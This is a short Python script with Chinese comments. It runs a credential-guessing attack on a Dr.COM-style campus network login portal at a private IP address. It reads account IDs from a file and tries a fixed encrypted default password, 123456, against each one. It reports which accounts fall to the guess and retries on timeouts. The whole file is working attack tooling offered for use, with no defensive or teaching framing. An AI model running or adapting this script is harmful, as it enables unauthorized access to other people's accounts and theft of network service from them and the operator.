import requests
import time


def try_login(account, encrypted_password):
    """尝试登录"""
    url = "http://172.19.1.240/0.htm"

    # 动态生成请求头，更新 Cookie 中的账号
    headers = {
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6",
        "Cache-Control": "max-age=0",
        "Connection": "keep-alive",
        "Content-Type": "application/x-www-form-urlencoded",
        # 动态设置 Cookie
        "Cookie": f"drcom_login={account}%7C123456",
        "Origin": "http://172.19.1.240",
        "Referer": "http://172.19.1.240/0.htm",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0"
    }

    # 固定的加密密码
    data = {
        "DDDDD": account,
        "upass": encrypted_password,  # 加密后的123456
        "R1": "0",
        "R2": "1",
        "R3": "1",
        "para": "00",
        "0MKKey": "123456",
        "v6ip": ""
    }

    try:
        # 设置超时时间为 2 秒
        response = requests.post(url, headers=headers, data=data, verify=False, timeout=2)
        response_text = response.text

        # 根据响应内容判断登录结果
        if "userid error3" in response_text or "userid error2" in response_text:
            print(f"账号 {account}：密码错误")
            return "skip"
        elif "userid error1" in response_text:
            print(f"账号 {account}：无效账号，跳过...")
            return "skip"
        elif "费用超支" in response_text:
            print(f"账号 {account}：无效账号，跳过...")
            return "skip"
        else:
            print(f"账号 {account} 登录成功！")
            return "success"
    except requests.RequestException as e:
        print(f"请求失败（超时或网络错误），继续尝试账号 {account}...")
        return "retry"


def brute_force_from_file(filename):
    """从文件读取账号列表并尝试登录"""
    encrypted_password = "a82d0bc0a9695b22269f9c8092db3c40123456782"  # 已加密的密码123456

    try:
        with open(filename, 'r') as file:
            accounts = file.readlines()
            for account in accounts:
                account = account.strip()
                if not account:
                    continue  # 跳过空行

                while True:
                    result = try_login(account, encrypted_password)

                    if result == "success":
                        break  # 登录成功，停止尝试
                    elif result == "skip":
                        break  # 无效账号，跳过
                    elif result == "retry":
                        time.sleep(0.5)  # 重试之前等待 0.5 秒，避免过度请求
    except FileNotFoundError:
        print(f"文件 {filename} 未找到。")
    except Exception as e:
        print(f"读取文件时出错: {e}")


if __name__ == "__main__":
    filename = "accounts.txt"  # 读取的账号文件
    brute_force_from_file(filename)
